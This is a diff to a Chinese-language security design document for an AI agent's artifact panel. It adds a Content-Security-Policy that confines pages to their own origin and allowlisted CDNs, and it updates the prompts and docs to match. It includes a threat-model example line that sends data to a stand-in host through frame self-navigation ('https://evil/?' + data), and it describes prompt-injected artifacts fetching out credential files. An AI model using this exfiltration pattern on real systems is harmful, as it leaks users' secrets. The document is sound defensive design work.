@@ -88,7 +88,24 @@ body: { "path": "<abs path of the html artifact>" }
 - `rel` 经 `path.Clean` 后不得以 `..` 开头；拼出的绝对路径 `filepath.EvalSymlinks` 之后必须仍在 `root` 之内（符号链接不能把目录带出去）。
 - 扩展名必须在资产表内（下节）；`.html` / `.htm` 不在表内，因此只有入口那一份 HTML 会被服务。
 - 入口 HTML 上限沿用 `artifactMaxBytes`（10 MB）；资产单文件上限 64 MB，流式 `io.Copy`。
-- 响应头：按扩展名的 `Content-Type`、`X-Content-Type-Options: nosniff`、`Cache-Control: no-store`、`Referrer-Policy: no-referrer`、`Origin-Agent-Cluster: ?1`、`Content-Security-Policy: frame-ancestors http://localhost:* http://127.0.0.1:*`。**不发** `Content-Security-Policy: sandbox`，这一头留给旧的 `/api/sessions/{id}/artifacts` 直开端点。
+- 响应头：按扩展名的 `Content-Type`、`X-Content-Type-Options: nosniff`、`Cache-Control: no-store`、`Referrer-Policy: no-referrer`、`Origin-Agent-Cluster: ?1`、以及下一节的 `Content-Security-Policy`。**不发** `Content-Security-Policy: sandbox`，这一头留给旧的 `/api/sessions/{id}/artifacts` 直开端点。
+
+### 出网边界：CSP
+
+同目录放行让页面能读到入口目录下的所有资产类型文件，比旧管线（只内联本会话写过的图片）宽得多；如果页面还能任意出网，一个被注入的制品就能把 `./service-account.json`、`./data.csv` 这类文件 `fetch` 出去。所以制品源和轻应用源的每个响应都带同一条 CSP（`internal/server/artifact_gate.go` 的 `artifactCSP`，从 CDN 白名单生成）：
+
+```
+default-src 'self' data: blob: https://cdn.bootcdn.net https://cdn.jsdelivr.net …;
+script-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: <同一组 CDN>;
+style-src  'self' 'unsafe-inline' data: blob: <同一组 CDN>;
+form-action 'self'; base-uri 'self';
+frame-ancestors http://localhost:* http://127.0.0.1:*
+```
+
+- 白名单从"gate 剥静态引用 + 提示模型的软约束"变成浏览器执行的硬边界：fetch / XHR / WebSocket / beacon / 图片 / 字体 / 媒体 / worker / 动态插入的脚本，一律只能指向自己的 origin 和白名单 CDN。
+- `'unsafe-inline'` 和 `'unsafe-eval'` 只给 script 和 style：页面自己的代码天然是内联的，库要编译模板和 WebAssembly。这条 CSP 是出网边界，不是 XSS 防线，XSS 防线是同源隔离。
+- 代价是页面不能再调用任意公网 API、不能加载任意外部图片。这与白名单的初衷（离线、国内、防腐烂）一致，提示词和 skill 明确告知模型：数据要放在页面里或同目录文件里。
+- **关不掉的一条**：frame 自导航（`location.href = 'https://evil/?' + data`）。CSP 没有 navigate-to 指令，sandbox 只禁顶层导航。`form-action 'self'` 关掉了表单提交这一形态，`location` 形态保留。它是可见的（frame 里的页面消失）且只能带 URL 长度以内的数据。接受并记录在 `SECURITY.md`。
 
 `frame-ancestors` 里没有 `[::1]`：CSP 的 host-source 语法没有 IPv6 字面量形式，写进去整条指令会被浏览器丢弃。后果是从 `http://[::1]:8088` 打开的 UI 嵌不了这个 frame，所以 grant 接口对 IPv6 字面量 Host 的请求直接回 409，轻应用面板对 `location.hostname` 含冒号的情况同样显示"仅在本机可用"，而不是让浏览器静默拦掉一个空白 frame。
 
@@ -177,9 +194,9 @@ Markdown 预览继续用 srcdoc iframe，sandbox 常量沿用 `ARTIFACT_SANDBOX`
 
 ## 文档与提示词同步
 
-- `internal/prompt/base.md` "Constraints on index.html"：删掉"Runs in a sandboxed iframe with no same-origin access ... no cross-origin fetch from scripts"和"Prefer inlining CSS and JS"两条，换成一句：页面可以用相对路径引用同目录下的文件（脚本、样式、图片、字体、模型、媒体），`.html` 除外；白名单外链规则不变。不再让模型判断使用环境。
+- `internal/prompt/base.md` "Constraints on index.html"：删掉"Runs in a sandboxed iframe with no same-origin access ... no cross-origin fetch from scripts"和"Prefer inlining CSS and JS"两条，换成两句：页面可以用相对路径引用同目录下的文件（脚本、样式、图片、字体、模型、媒体），`.html` 除外；页面的网络被 CSP 限在自身文件和白名单 CDN，数据要放在页面里或同目录文件里。不再让模型判断使用环境。
 - `internal/skills/defaults/artifact-design/SKILL.md` 与 base.md 同步改，涉及四处：frontmatter description 里的"sandboxed iframe"改为"separate origin"；"How the panel actually works" 的第一条 **Sandboxed, not sandboxed-privileged** 整条重写为：页面跑在自己的独立 origin 上，`localStorage` / IndexedDB / 下载 / 全屏 / 指针锁定原生可用，但它是应用之外的另一个源，碰不到宿主 cookie 和 `/api`；第二条 **External references are allowlist-gated** 删掉"Still default to inlining ... Embed images as `data:` URIs"那段，改为同目录文件直接用相对路径引用，`data:` URI 不再是默认；"Self-contained checklist" 改名为 "Before you write"，删掉"everything else is inlined in one `<style>`/`<script>` block"和"Any image is a `data:` URI or omitted"两项，换成"本地资源用相对路径且文件确实在入口 HTML 同目录下"。**Theme support is one-directional** 一条不动：`?theme=` 只喂给 Go gate 的横幅，不承诺给页面。`references/charts.md` 与 `references/palette.md` 不涉及沙箱，不动。
-- `SECURITY.md` "What is defended" 表加一行：agent 生成的 HTML（prompt injection 可写出）在独立源 `*.artifacts.localhost` / `*.apps.localhost` 上运行，制品源上没有 API，其 Origin 被 CSRF 门拒绝。
+- `SECURITY.md` "What is defended" 表加两行：agent 生成的 HTML（prompt injection 可写出）在独立源 `*.artifacts.localhost` / `*.apps.localhost` 上运行，制品源上没有 API，其 Origin 被 CSRF 门拒绝；页面对同目录文件的读取被 CSP 限制为只能送往自身 origin 和白名单 CDN，frame 自导航这一残余通道明文记录。
 - `dev-docs/web-artifacts-panel-design.md` "Rendering security" 与 `dev-docs/light-apps-design.md` "运行沙箱 / 运行时存储 / 运行时下载" 改写为本文档描述的状态；两处关于 mobile 制品预览的描述删除。
 - `dev-docs/serve-auth-design.md` 威胁模型表加"制品源脚本跨源调 API"一行，防线是 `originAllowed`。
 - 用户文档 `docs/src/content/docs/guides/light-apps.mdx` 与 `docs/src/content/docs/zh/guides/light-apps.mdx`：目录树注释"自包含页面（不依赖 CDN、不请求外部资源）"、"运行在浏览器的 sandboxed iframe 里"、生成规则里的"完全自包含：不能引用 CDN、不能请求外部图片、不能跨域 fetch"和"CSS 和 JS 都内联"四处改写为独立源的描述（可引用白名单 CDN、可用相对路径引用同目录文件、`localStorage` 原生持久），并加一句"仅在本机可用，手机端不提供"。这两页在 CDN 白名单落地时就已经过时，本次一并修。
